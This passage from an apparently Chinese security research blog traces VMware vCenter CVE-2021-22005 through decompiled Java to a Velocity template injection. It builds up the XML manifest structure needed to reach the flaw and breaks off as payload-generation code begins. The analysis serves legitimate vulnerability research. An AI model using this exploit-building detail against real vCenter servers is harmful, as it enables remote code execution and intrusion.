src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/25.png"></p><p>跟入collect()：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collect() —&gt;com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/26.png"></p><p>​    这个方法有两步重要操作，第一步根据xml数据构建Manifest对象。第二步对manifestToExecute进行收集操作。先分析第一步XML构造</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/27.png"></p><h4 id="3-2-1-根据XML数据还原Manifest对象"><a href="#3-2-1-根据XML数据还原Manifest对象" class="headerlink" title="3.2.1 根据XML数据还原Manifest对象"></a>3.2.1 根据XML数据还原Manifest对象</h4><p>在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest()</code>方法中，根据用户传入的<code>manifestContent</code>内容，系统使用不同的解析器（<code>XmlManifestParser、VsanHealthJsonManifestParser、VsanPerformanceJsonManifestParser</code>）去解析</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/28.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/29.png"></p><p>筛选规则在解析器类的isApplicable()中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#isApplicable</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanHealthJsonManifestParser<span class="hljs-selector-id">#isApplicable</span><span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanPerformanceJsonManifestParser#isApplicable<br></code></pre></td></tr></table></figure><p>​                                                                                                   <img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/30.png"> </p><p>接着调用解析器的getManifest()，即<code>com.vmware.ph.phservice.collector.internal.manifest.xml.XmlManifestParser#getManifest()</code>，在这个方法中规定了各个标签内容，依次为：<code>&lt;requestSchedules&gt;、&lt;request&gt;、&lt;cdfmapping&gt;</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public Manifest get<span class="hljs-constructor">Manifest(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">schedule</span>)</span> &#123;<br>   <span class="hljs-comment">//1、限制必须包含&lt;requestSchedules&gt;</span><br>        Document manifestDoc = get<span class="hljs-constructor">ManifestDocForSchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_isLegacySchedulingSupported</span>)</span>;<br>        <span class="hljs-keyword">if</span> (manifestDoc<span class="hljs-operator"> == </span>null) &#123;<br>            return null;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            NamedQuery<span class="hljs-literal">[]</span> queries = parse<span class="hljs-constructor">Queries(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_requestParser</span>)</span>;<br>            NamedQuery<span class="hljs-literal">[]</span> queriesForSchedule = this.get<span class="hljs-constructor">NamedQueriesForSchedule(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">queries</span>)</span>;<br>            <span class="hljs-comment">//2、限制&lt;request&gt;标签必须包含一个&lt;query&gt;标签</span><br>            <span class="hljs-keyword">if</span> (queriesForSchedule != null<span class="hljs-operator"> &amp;&amp; </span>queriesForSchedule.length != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//3、解析&lt;cdfmapping&gt;标签，这个是需要放payload的标签</span><br>                NamedQueryResultSetMapping&lt;Payload20&gt; cdfNamedQueryMapping = get<span class="hljs-constructor">CdfNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_cdfMappingParser</span>)</span>;<br>                NamedQueryResultSetMapping&lt;File&gt; fileNamedQueryMapping = get<span class="hljs-constructor">FileNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_fileMappingParser</span>)</span>;<br>                List&lt;ObfuscationRule&gt; obfuscationRules = parse<span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_obfuscationRulesParser</span>)</span>;<br>                <span class="hljs-built_in">int</span> recommendedPageSize = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">manifestDoc</span>, 5000)</span>;<br>                <br>                Manifest result = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Builder</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Queries(<span class="hljs-params">queriesForSchedule</span>)</span>.<span class="hljs-keyword">with</span><span class="hljs-constructor">CdfMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">cdfNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">FileMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">fileNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">getNonNullObfuscationRules</span>(<span class="hljs-params">obfuscationRules</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">recommendedPageSize</span>)</span>.build<span class="hljs-literal">()</span>;<br>                return result;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                return null;<br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>a、构造<requestSchedules>标签</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static Document get<span class="hljs-constructor">ManifestDocForSchedule(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">collectionSchedule</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">isLegacySchedulingSupported</span>)</span> &#123;<br>        boolean containsRequestScheduleSection = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>contains<span class="hljs-constructor">RequestScheduleSection(<span class="hljs-params">manifestStr</span>)</span>;<br>        Document manifestDocument;<br>        <span class="hljs-keyword">if</span> (containsRequestScheduleSection) &#123;<span class="hljs-comment">//必须包含requestSchedules标签</span><br>            manifestDocument = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">NonDailySection(<span class="hljs-params">manifestStr</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLegacySchedulingSupported) &#123;<span class="hljs-comment">//默认false</span><br>            manifestDocument = get<span class="hljs-constructor">ManifestDocForLegacySchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">collectionSchedule</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            manifestDocument = null;<br>        &#125;<br>        return manifestDocument;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/31.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/32.png"></p><p><code>&lt;requestSchedules&gt;标签对应的类是：com.vmware.ph.phservice.collector.internal.manifest.xml.scheduling.data.RequestScheduleSpec</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/33.png"></p><p>构造完成<requestSchedules>标签:<code>&lt;requestSchedules&gt;&lt;/requestSchedules&gt;</code></p><p>b、构造<request>标签</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#parseQueries</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestUtils#parseRequestSpec<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/34.png"></p><p>解析<request>标签的解析器：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.JaxbRequestSpecParser#parse</code>,限制了必须包含<code>&lt;constraint&gt;</code>标签</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/35.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/36.png"></p><p><request>标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.RequestSpec</code></p><p>​                                                  <img src="/../../../../images/c3442871da035b4836c30ca52af6386b2b9a3944713588fd665b518b3c05dc94.png" alt="图 4">  </p><p>query标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec</code></p><p>​                                                <img src="/../../../../images/1f99ba2290974305704d0bbc37151205aa6709083d2fc0056eb8ca64bf8bcf45.png" alt="图 5">  </p><p>constraint标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec#QuerySpec()</code></p><p>​                                             <img src="/../../../../images/1287bb7f2b34501c61cd57cf762cb7fe7662ad01f965afb0da35a130aa0ce4ce.png" alt="图 6">  </p><p>构造<request>标签：<code>&lt;request&gt;&lt;query&gt;&lt;constraint&gt;&lt;targetType&gt;xxx&lt;/targetType&gt;&lt;/constraint&gt;&lt;/query&gt;&lt;/request&gt;</code></p><p>c、构造<cdfMapping>标签</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">com.vmware.ph.phservice.collector.<span class="hljs-keyword">internal</span>.manifest.xml.XmlManifestUtils<span class="hljs-meta">#parseCdfMapping</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;I, O&gt; <span class="hljs-function">Mapping&lt;I, O&gt; <span class="hljs-title">parseCdfMapping</span>(<span class="hljs-params">Document manifestDoc, MappingParser mappingParser</span>)</span> &#123;<br><span class="hljs-keyword">return</span> parseMapping(manifestDoc, mappingParser, <span class="hljs-string">&quot;cdfMapping&quot;</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><cdfMapping>标签对应的解析器:<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.JaxbCdfMappingParser#parse</code></p><p>58行限制了<cdfMapping>的第一个节点对应类为：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code>,拿到IndependentResultsMapping对象后，调用其<code>build()</code>返回重新构造的<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping</code>对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/37.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/38.png"></p><p><code>&lt;indepedentResultsMapping&gt;</code>标签对应类：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/39.png"></p><p>在build()时会根据属性值<code>resultSetMappings</code>重新构建<code>IndependentResultsMapping</code>对象.所以需要加上resultSetMappings属性值，这部分后面构造时会讲解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们接着往下看，解析器构建完Manifest对象后开始检查queries变量：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/40.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.iternal.collector.CollectionTriggerTypeManifestParser#filterOnDemandQueries</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/41.png"></p><p>限制<code>&lt;request&gt;</code>的子标签<code>&lt;query&gt;</code>必须包含name,调整为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">aaa</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>sss<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-2-对manifestToExecute进行收集操作"><a href="#3-2-2-对manifestToExecute进行收集操作" class="headerlink" title="3.2.2 对manifestToExecute进行收集操作"></a>3.2.2 对manifestToExecute进行收集操作</h4><p>构建好<code>Manifest</code>对象之后就到了：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code>的第二步操作</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/42.png"></p><p>跟入：<code>com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collect-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collectAndUpload-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#processStructuredDataCollectors</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/43.png"></p><p>这里的几步操作分别为：<code>收集payloads、创建迭代器、判断迭代器、依次访问迭代器</code>，在访问迭代器时触发map()是导致本次漏洞的主因。下面对这三部分依次讲解</p><h5 id="3-2-2-1-第一部分：收集payloads"><a href="#3-2-2-1-第一部分：收集payloads" class="headerlink" title="3.2.2.1 第一部分：收集payloads"></a>3.2.2.1 第一部分：收集payloads</h5><p>最终返回的是重写了iterator()的<code>FluentIterable</code>对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/44.png">相当于伪代码：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">fromIterable = <span class="hljs-keyword">this</span>.collectors<br><br>Function <span class="hljs-function"><span class="hljs-keyword">fun</span> = new Function<span class="hljs-type">&lt;CdfCollector, Iterable&lt;CollectedPayload&gt;</span>&gt;<span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">public</span> Iterable&lt;CollectedPayload&gt; apply(CdfCollector input) &#123;<br>        long startTimeNano = System.nanoTime();<br>        xxx<br>    &#125;<br>&#125;));<br><br>FluentIterable fl = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>        <span class="hljs-keyword">return</span> Iterators.transform(fromIterable.iterator(), <span class="hljs-function"><span class="hljs-keyword">fun</span>);</span><br>        &#125;<br>    &#125;;<br>&#125;<br><br>FluentIterable f2 = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>    <span class="hljs-keyword">return</span> Iterators.concat(Iterables.iterators(fl));<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">return</span> f2<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-第二部分：创建迭代器"><a href="#3-2-2-2-第二部分：创建迭代器" class="headerlink" title="3.2.2.2 第二部分：创建迭代器"></a>3.2.2.2 第二部分：创建迭代器</h5><p>开始调用:<code>collectedPayloads.iterator()</code>,即<code>f2.iterator()</code>,调用链：<code>f2.iterator()-&gt;f1.iterator()-&gt;Iterators.transform()-&gt;Iterators.concat()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/45.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/46.png"></p><p>最终<code>concat()</code>返回了实现hasNext()、next()、remove()的Iterator对象，input是<code>TransformedIterator</code>对象,相当于（伪代码）：</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim">fromIterator = this.collectors.<span class="hljs-keyword">iterator</span>();<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator1 = new <span class="hljs-type">TransformedIterator</span>&lt;F, T&gt;(fromIterator) &#123;<br>    T transform(F <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> fun.apply(<span class="hljs-keyword">from</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator2 = new <span class="hljs-type">TransformedIterator</span>&lt;<span class="hljs-type">Iterable</span>&lt;? extends T&gt;, <span class="hljs-type">Iterator</span>&lt;? extends T&gt;&gt;(transformedIterator1) &#123;<br>    <span class="hljs-type">Iterator</span>&lt;? extends T&gt; transform(<span class="hljs-type">Iterable</span>&lt;? extends T&gt; <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>.<span class="hljs-keyword">iterator</span>();<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-type">Iterator</span> iterator1 = new <span class="hljs-type">Iterator</span>&lt;T&gt;() &#123;<br>inputs = transformedIterator2;<br>    public boolean hasNext() <span class="hljs-meta">&#123;...&#125;</span><br>    public T next() <span class="hljs-meta">&#123;...&#125;</span><br>    public <span class="hljs-type">void</span> remove() <span class="hljs-meta">&#123;...&#125;</span><br>&#125;;<br><br><br><span class="hljs-keyword">return</span> iterator1;<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-第三部分：判断迭代器"><a href="#3-2-2-2-第三部分：判断迭代器" class="headerlink" title="3.2.2.2 第三部分：判断迭代器"></a>3.2.2.2 第三部分：判断迭代器</h5><p>接着开始调用<code>collectedPayloadsIterator.hasNext()</code>即<code>iterator1.hasNext()</code>判断是否next()存在值，<code>inputs.hasNext()-&gt;transformedIterator2.hasNext()-&gt;transformedIterator1#hasNext()-&gt;this.collectors.iterator().hasNext()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/47.png"></p><p>判断存在后，调用inputs.next()进行赋值：<code>inputs.next()-&gt;transformedIterator2.next()-&gt;transformedIterator1#next()-&gt;this.collectors.iterator().next()-&gt;transformedIterator1.transform()-&gt;fun.apply()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/48.png"></p><p>调用到<code>input.collect(manifest, queryService, context, pageSize);</code>,将我们传入的<code>&lt;query&gt;</code>与<code>&lt;cdfMapping&gt;</code>赋值给queries、payloadMappin</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/49.png"></p><p>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#collect</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/50.png"></p><p><code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#filterQueriesForExecution</code>限制了IndependentResultsMapping#_queryNameToResultSetMapping的entry要包含<query>的name值即：<code>&lt;query name=&quot;aaa&quot;&gt;    &lt;cdfMapping&gt;&lt;indepedentResultsMapping&gt;&lt;resultSetMappings&gt;&lt;entry&gt;&lt;key&gt;aaa&lt;/key&gt;&lt;/entry&gt;&lt;/resultSetMappings&gt;&lt;/indepedentResultsMapping&gt;</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/51.png"></p><p>添加query之后返回实现了iterator()的Iterable对象，继续往下执行到<code>Iterables.transform(result, obfuscationFunction);</code>，返回实现了iterator()的FluentIterable类对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/52.png"></p><p>接着执行到<code>Iterables.concat(result, perfData);</code>，返回实现了iterator()的FluentIterable类对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/53.png"></p><p>​                                         &#x2F;<img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/54.png"></p><p>相当于伪代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Iterable iterable2 = <span class="hljs-keyword">new</span> Iterable&lt;OUT&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;OUT&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">QueryServiceCollector</span>.</span></span>this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_resultIteratorFactory</span>.</span></span>get<span class="hljs-constructor">Iterator(<span class="hljs-params">queryService</span>, <span class="hljs-params">responseMapping</span>, <span class="hljs-params">modifiedContext</span>, <span class="hljs-params">queriesForExecution</span>, <span class="hljs-params">pageSize</span>)</span>;<br>    &#125;<br>&#125;);<br><br><br>FluentIterable f3 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>transform(iterable2.iterator<span class="hljs-literal">()</span>, <span class="hljs-keyword">new</span> QueryServiceCdfCollector.<span class="hljs-constructor">ObfuscationFunction(<span class="hljs-params">this</span>.<span class="hljs-params">_obfuscator</span>, <span class="hljs-params">obfuscationRules</span>)</span>);<br>    &#125;<br>&#125;;<br><br>FluentIterable f4 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>concat(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterables</span>.</span></span>iterators(inputs));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>调用完内层的transformedIterator1后开始调用transformedIterator2.transform()</p><p><code>transformedIterator2.transform()-&gt;from.iterator()-&gt;f4.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/55.png"></p><p>调用到上面定义的iterator()，返回<code>responseMappingIterable.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/56.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/57.png"></p><h5 id="3-2-2-4-第四部分：访问迭代器"><a href="#3-2-2-4-第四部分：访问迭代器" class="headerlink" title="3.2.2.4 第四部分：访问迭代器"></a>3.2.2.4 第四部分：访问迭代器</h5><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/58.png"></p><p>com.vmware.cis.data.internal.provider.ProviderRepository#getProviderForModel  判断<code>&lt;targetType&gt;</code>标签内容必须存在于_providerByModel中,原始exp采用的是“ServiceInstance”</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/59.png"></p><p>接着调用<code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector.ResultIteratorFactory#getIterator</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/60.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/61.png"></p><p>开始调用传入标签的map()</p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/62.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResultSetToCdfPayloadMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/63.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.SafeMappingWrapper#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/64.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/65.png"></p><p>作者找到了com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map()中存在Velocity模板注入</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/66.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/67.png"></p><p>接着我们使用代码生成<cdfMapping>标签的内容：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 